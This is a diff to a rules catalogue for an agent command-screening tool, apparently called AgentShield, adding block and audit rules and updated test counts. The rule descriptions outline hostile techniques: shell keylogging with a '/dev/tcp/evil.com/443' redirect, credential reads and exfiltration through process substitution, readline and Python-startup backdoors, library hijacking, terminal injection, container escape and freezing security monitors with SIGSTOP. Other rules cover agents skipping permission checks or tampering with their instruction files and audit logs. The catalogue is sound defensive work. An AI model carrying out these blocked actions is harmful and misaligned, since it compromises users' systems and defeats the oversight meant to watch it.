@@ -6,15 +6,15 @@
 
 | Metric | Count |
 |--------|-------|
-| Terminal rules | 562 |
+| Terminal rules | 602 |
 | MCP rules | 118 |
-| Total rules | 680 |
-| Test cases (TP+TN) | 1800 |
+| Total rules | 720 |
+| Test cases (TP+TN) | 1934 |
 | Kingdoms covered | 10 |
 
 ## Runtime Rules by Kingdom
 
-### credential-exposure (46 rules)
+### credential-exposure (51 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -64,8 +64,13 @@
 | `ts-block-curl-file-protocol` | BLOCK | regex | curl with file:// protocol reads local files — can access /etc/shadow, SSH keys, credentials without triggering file-read rules. Often chained with pipe to exfiltrate. MITRE T1005. |
 | `ts-block-wget-file-protocol` | BLOCK | regex | wget with file:// protocol reads local files to disk — saves sensitive files like SSH keys or shadow to attacker-specified path. MITRE T1005. |
 | `ts-block-git-askpass-env` | BLOCK | regex | GIT_ASKPASS sets a program invoked to prompt for credentials — attacker replaces it with a script that steals passwords. MITRE T1556. |
+| `ts-block-bash-xtracefd-redirect` | BLOCK | regex | BASH_XTRACEFD redirects shell xtrace output (set -x) to an arbitrary file descriptor — captures every command with fully-expanded variable values (passwords, API keys, tokens) as a complete shell keylogger. Combined with 'exec FD>/dev/tcp/evil.com/443', streams all shell activity to an attacker in real time. MITRE T1056.001, CWE-532. |
+| `ts-block-xtrace-exec-redirect` | BLOCK | regex | File descriptor opened to staging/network path followed by BASH_XTRACEFD assignment — two-stage setup for xtrace-based keylogging. The exec opens a write channel, then BASH_XTRACEFD redirects all traced commands (with expanded secrets) to that channel. MITRE T1056.001, CWE-532. |
+| `ts-block-xtrace-fd-then-exec` | BLOCK | regex | BASH_XTRACEFD set followed by exec fd redirect to staging/network path — xtrace keylogger setup in reverse order. Captures all command traces with expanded secrets. MITRE T1056.001, CWE-532. |
+| `ts-block-procsub-credential-read` | BLOCK | regex | Process substitution reading credential/sensitive files — creates an ephemeral /dev/fd/N handle that bypasses path-based monitoring. The outer command only sees /dev/fd/N, not the sensitive path. MITRE T1003, CWE-200. |
+| `ts-audit-procsub-system-read` | AUDIT | regex | Process substitution reading system files (/etc/, /proc/, /sys/) — may be used to access sensitive system data through an ephemeral file descriptor that bypasses path monitoring. MITRE T1005. |
 
-### data-exfiltration (97 rules)
+### data-exfiltration (98 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -166,6 +171,7 @@
 | `ts-audit-huggingface-cli-upload` | AUDIT | regex | huggingface-cli upload — pushing model artifacts to HuggingFace Hub may expose proprietary fine-tuned weights, LoRA adapters, or training datasets to public or unauthorized repositories. OWASP LLM02/LLM03. |
 | `de-llmdf-audit-shared-system-prompt` | AUDIT | regex | Setting a shared/global system prompt env var overrides per-tenant context isolation in multi-tenant LLM deployments — all tenants share the same prompt, enabling cross-tenant data exposure. OWASP LLM02/LLM06/LLM08. |
 | `de-llmdf-audit-vector-query-no-namespace` | AUDIT | regex | Pinecone CLI query/fetch/upsert without --namespace uses a shared index without per-tenant isolation, risking cross-tenant RAG data leakage where one tenant retrieves another's documents. OWASP LLM02/LLM06/LLM08. |
+| `ts-block-procsub-exfil` | BLOCK | regex | Output process substitution piping data to a network tool — exfiltrates data through an ephemeral file descriptor. The source command (tar, cat) has no network references, making the exfiltration invisible to single-command analysis. MITRE T1048. |
 
 ### destructive-ops (40 rules)
 
@@ -223,7 +229,7 @@
 | `ts-audit-ai-finetune-launch` | AUDIT | regex | AI fine-tuning job launched without authorization check. Fine-tuning LLMs processes training data (potential PII/confidential content — EU AI Act Art.10), creates unreviewed model artifacts (Art.13/NIST GOVERN-6), and incurs unbounded compute costs. A prompt-injected agent may launch fine-tuning to create a backdoored model variant. Verify training data provenance, budget approval, and model governance sign-off before proceeding (OWASP LLM02/LLM06, CWE-285). |
 | `ts-audit-ai-model-publish` | AUDIT | regex | AI model artifact uploaded to a public registry without governance review. Publishing model weights may expose proprietary fine-tuning data or PII embedded in model parameters (OWASP LLM02, EU AI Act Art.13). No model card, risk assessment, or IP review documented. Verify organizational approval and data classification before publishing (CWE-200, NIST AI RMF GOVERN-6). |
 
-### persistence-evasion (80 rules)
+### persistence-evasion (97 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -307,8 +313,25 @@
 | `ts-audit-agentshield-log-env-disable` | AUDIT | regex | Setting AgentShield log-level environment variable to suppress audit output — disables the runtime security audit trail before command execution. OWASP LLM06, MITRE T1562.001. |
 | `ts-audit-agentshield-log-timestamp-tamper` | AUDIT | regex | Timestamp manipulation on AgentShield audit log files — alters file modification times to obscure when audit events occurred, breaking forensic timeline reconstruction. MITRE T1070.006, EU AI Act Art.13. |
 | `ts-audit-agent-instruction-file-tampering` | AUDIT | regex | Writing to an AI agent instruction file (CLAUDE.md, .cursorrules, .windsurf/rules) — persistent modification of agent system instructions is a config-level prompt injection vector that persists across sessions. OWASP LLM01, MITRE T1564. |
+| `ts-block-bind-x-shell-exec` | BLOCK | regex | Readline key binding with shell command execution (bind -x) — maps a keypress to arbitrary shell command execution. Creates a stealth backdoor triggered by normal keyboard usage (Enter, Tab, Ctrl-L). The command runs silently on every keypress, ideal for keylogging, credential interception, or persistent beaconing. MITRE T1546.004, CWE-94. |
+| `ts-block-inputrc-override` | BLOCK | regex | INPUTRC environment override — forces readline to load macros from an attacker-controlled file. The malicious inputrc can map keys to shell commands ($if...\e[...\C-m), silently installing keyloggers or backdoors triggered by normal typing. MITRE T1546.004. |
+| `ts-audit-bind-macro` | AUDIT | regex | Readline key binding detected — while 'bind' without -x maps to readline functions (not shell commands), macros can still inject keystrokes that produce dangerous commands when replayed. Auditing for review. MITRE T1546.004. |
+| `ts-block-complete-c-code-exec` | BLOCK | regex | Tab completion with external command execution (complete -C) — runs an arbitrary command/script every time Tab is pressed for the target command. Creates a high-frequency stealth execution channel invisible to the user. Unlike complete -F (shell function), -C runs external commands that can exfiltrate data or beacon. MITRE T1546.004, CWE-94. |
+| `ts-audit-complete-f-function` | AUDIT | regex | Tab completion with shell function (complete -F) — registers a function to run on Tab press. Less dangerous than -C (runs existing function, not external command) but still installs a hook that fires on user input. Auditing for review. MITRE T1546.004. |
+| `ts-block-patchelf-hijack` | BLOCK | regex | patchelf modifying interpreter or library paths in an ELF binary — redirects dynamic linking to attacker-controlled libraries. --set-interpreter replaces ld-linux.so (code exec before main), --set-rpath poisons library search order. MITRE T1574.006, CWE-426. |
+| `ts-audit-patchelf` | AUDIT | regex | patchelf invocation detected — ELF binary modification tool. Even read-only operations (--print-rpath) may indicate reconnaissance for library hijacking. MITRE T1574.006. |
+| `ts-block-objcopy-inject` | BLOCK | regex | objcopy --add-section injects arbitrary data into ELF binary sections — can embed shellcode, backdoors, or C2 config into trusted system binaries that bypass file integrity checks. MITRE T1027.009. |
+| `ts-block-objcopy-modify-exec` | BLOCK | regex | objcopy modifying executable sections — can update section contents, rename sections to hide payloads, or mark data sections as executable for code injection. MITRE T1027.009. |
+| `ts-block-elfedit` | BLOCK | regex | elfedit modifies ELF headers directly — can change entry point, OS/ABI type, or machine architecture. Altering the entry point redirects execution to injected code. MITRE T1027.009. |
+| `ts-block-install-name-tool-hijack` | BLOCK | regex | install_name_tool modifying Mach-O binary load commands — -change replaces dylib paths, -add_rpath poisons library search order. macOS equivalent of patchelf for library hijacking. MITRE T1574.004. |
+| `ts-audit-install-name-tool` | AUDIT | regex | install_name_tool detected — Mach-O binary modification tool. May indicate reconnaissance for dylib hijacking on macOS. MITRE T1574.004. |
+| `ts-block-python-pth-write` | BLOCK | regex | Writing a .pth file to a Python site-packages/dist-packages directory — .pth files are automatically processed on every Python invocation and can contain 'import' statements that execute arbitrary code. Survives pip upgrades and virtualenv rebuilds. MITRE T1546.016. |
+| `ts-block-python-pth-tee` | BLOCK | regex | tee writing a .pth file to a Python packages directory — tee writes to its filename argument directly (no redirect needed). .pth files execute on every Python invocation. MITRE T1546.016. |
+| `ts-block-python-pth-cp` | BLOCK | regex | Copying/moving a file into site-packages/dist-packages as a .pth file — installs persistent Python startup code executed on every Python invocation. MITRE T1546.016. |
+| `ts-block-python-sitecustomize-write` | BLOCK | regex | Writing to sitecustomize.py or usercustomize.py — these files are automatically imported during Python startup before any user code runs. Provides persistent, silent code execution on every Python invocation. MITRE T1546.016. |
+| `ts-audit-site-packages-write` | AUDIT | regex | Writing directly to a Python site-packages/dist-packages directory — may install persistent code that runs on Python startup. Legitimate package installation should use pip, not direct file writes. MITRE T1546.016. |
 
-### privilege-escalation (76 rules)
+### privilege-escalation (89 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -388,6 +411,19 @@
 | `ts-audit-psql-pg-shadow-query` | AUDIT | regex | psql querying pg_shadow or pg_authid — reading password hashes from system catalogs exceeds normal application database access scope, enabling offline credential attacks. OWASP LLM06, MITRE T1552/T1548. |
 | `ts-block-claude-dangerous-skip-permissions` | BLOCK | regex | claude --dangerously-skip-permissions disables all permission checks — a compromised orchestrator spawning a sub-agent with this flag creates a fully-unrestricted delegated session, achieving authority escalation through delegation. This is the AI-native confused deputy attack (OWASP LLM06, MITRE T1078/T1134). |
 | `ts-audit-agent-wildcard-tools` | AUDIT | regex | claude --allowed-tools '*' grants the delegated sub-agent access to all available tools — wildcard delegation exceeds any specific task scope and accumulates composite permissions that no single delegation step was intended to grant (OWASP LLM06, MITRE T1134). |
+| `ts-block-pts-write` | BLOCK | regex | Redirecting output to /dev/pts/N injects arbitrary bytes into another terminal session — the victim's shell executes them with the victim's privileges, including any active sudo or SSH sessions. MITRE T1021.004, CWE-287. |
+| `ts-block-echo-pts` | BLOCK | regex | echo/printf to /dev/pts/N injects text into another terminal session as if typed by the user — can execute commands with the victim's credentials. MITRE T1021.004. |
+| `ts-block-reptyr` | BLOCK | regex | reptyr re-parents a running process from another terminal to the current one via ptrace — can hijack authenticated sudo sessions, SSH connections, or database shells with active credentials. MITRE T1055.008. |
+| `ts-block-conspy` | BLOCK | regex | conspy attaches to a Linux virtual console (tty1-tty63), displaying its contents and allowing keystroke injection — KVM-style remote console attack without physical access. MITRE T1056.001. |
+| `ts-block-writevt` | BLOCK | regex | writevt injects text directly into a virtual terminal — legacy tool with no legitimate AI agent use case. Can inject commands into login sessions. MITRE T1056. |
+| `ts-block-bind-mount` | BLOCK | regex | Bind mount overlays one path over another — can expose protected files, escape container filesystems, or make credential files accessible from unprivileged locations. MITRE T1611, CWE-269. |
+| `ts-block-remount-weaken` | BLOCK | regex | Remounting with exec/suid removes security hardening from mount points — enables SUID binary execution from /tmp, /dev/shm, or other world-writable locations. MITRE T1548.001, CWE-269. |
+| `ts-block-overlay-mount` | BLOCK | regex | Overlay filesystem mount layers a writable upper directory over system paths — enables persistent modification of protected binaries (/usr/bin, /usr/sbin) that survives overlay teardown if synced. MITRE T1601.001. |
+| `ts-block-mount-proc-root-escape` | BLOCK | regex | Mounting /proc/PID/root exposes the host filesystem from within a container — complete container escape giving access to host credentials, binaries, and configuration. MITRE T1611. |
+| `ts-block-chrpath-rpath-poison` | BLOCK | regex | chrpath modifying RPATH/RUNPATH in an ELF binary — changes shared library search order to load attacker-controlled libraries before system libraries. Persistent: survives reboots and LD_PRELOAD resets. MITRE T1574.006. |
+| `ts-block-ld-library-path-poison` | BLOCK | regex | Exporting LD_LIBRARY_PATH pointing to a writable/temp directory — every subsequently launched binary searches this path first for shared libraries, enabling trojan library injection. Affects all child processes. MITRE T1574.007. |
+| `ts-audit-ld-library-path-export` | AUDIT | regex | Exporting LD_LIBRARY_PATH — changes shared library search order for all child processes. While sometimes legitimate (custom builds), it can be used for library hijacking. MITRE T1574.007. |
+| `ts-audit-chrpath` | AUDIT | regex | chrpath detected — tool for viewing and modifying RPATH/RUNPATH in ELF binaries. May indicate shared library hijacking preparation. MITRE T1574.006. |
 
 ### reconnaissance (55 rules)
 
@@ -519,7 +555,7 @@
 | `ts-block-compiler-plugin-inject` | BLOCK | regex | Compiler/linker flag injection via build variables — -fplugin loads arbitrary shared objects during compilation, --wrap redirects function calls. MITRE T1195.002. |
 | `ts-audit-vectordb-inline-add` | AUDIT | regex | Python one-liner adding documents to a vector store (Chroma/Qdrant/Weaviate/Pinecone/Milvus) — inline vector store writes bypass provenance validation and are a key delivery mechanism for adversarial embedding manipulation that poisons RAG retrieval results (OWASP LLM04/LLM08, MITRE T1565.001). |
 
-### unauthorized-execution (95 rules)
+### unauthorized-execution (99 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -618,6 +654,10 @@
 | `ts-audit-mcp-server-npx-install` | AUDIT | regex | npx -y installing an MCP server package without interactive review — typosquatted or compromised MCP server packages can impersonate trusted tools and gain full access to agent context, tool execution, and data flows. OWASP LLM08, MITRE T1195. |
 | `ts-block-git-commit-no-verify` | BLOCK | regex | git commit --no-verify (-n) bypasses all pre-commit hooks including security linters (semgrep, bandit, gosec, trufflehog) — the last automated gate catching AI-generated vulnerabilities (SQLi, hardcoded secrets, weak crypto) before they enter source control (OWASP LLM05, CWE-799). |
 | `ts-audit-git-push-no-verify` | AUDIT | regex | git push --no-verify bypasses pre-push hooks including remote security scanning gates — skipping final automated quality and security checks before LLM-generated code reaches shared branches. OWASP LLM05, MITRE T1059. |
+| `ts-block-enable-f-loadable-builtin` | BLOCK | regex | Loading arbitrary shared object as bash builtin via 'enable -f' — injects code directly into bash's process address space. Unlike LD_PRELOAD, this bypasses environment variable monitoring entirely. The loaded code can replace builtins (read, cd, echo), intercept all shell I/O, and access bash internal state. MITRE T1546.004, CWE-94. |
+| `ts-block-signal-process-freeze` | BLOCK | regex | Sending SIGSTOP/SIGTSTP/SIGCONT to a process — freezes a process without killing it. Used to silently pause security monitors while performing malicious actions, then resume them leaving no evidence. MITRE T1562.001. |
+| `ts-block-pkill-process-freeze` | BLOCK | regex | Sending SIGSTOP/SIGTSTP/SIGCONT via pkill/killall — freezes processes by name pattern. Can target security monitors (agentshield, auditd, falco) without knowing their PID. MITRE T1562.001. |
+| `ts-block-signal-freeze-pgrep` | BLOCK | regex | SIGSTOP/SIGCONT via command substitution (e.g., kill -STOP $(pgrep auditd)) — dynamically discovers and freezes monitoring processes. The substitution makes detection harder. MITRE T1562.001. |
 
 ### uncategorized (2 rules)
 
@@ -800,13 +840,13 @@
 
 | Kingdom | TP | TN | Total |
 |---------|----|----|-------|
-| credential-exposure | 112 | 89 | 201 |
+| credential-exposure | 125 | 97 | 222 |
 | data-exfiltration | 167 | 100 | 267 |
 | destructive-ops | 76 | 51 | 127 |
-| persistence-evasion | 161 | 95 | 256 |
-| privilege-escalation | 165 | 105 | 270 |
+| persistence-evasion | 189 | 116 | 305 |
+| privilege-escalation | 197 | 124 | 321 |
 | reconnaissance | 128 | 51 | 179 |
-| supply-chain | 93 | 63 | 156 |
-| unauthorized-execution | 205 | 139 | 344 |
-| **Total** | **1107** | **693** | **1800** |
+| supply-chain | 93 | 67 | 160 |
+| unauthorized-execution | 210 | 143 | 353 |
+| **Total** | **1185** | **749** | **1934** |
 
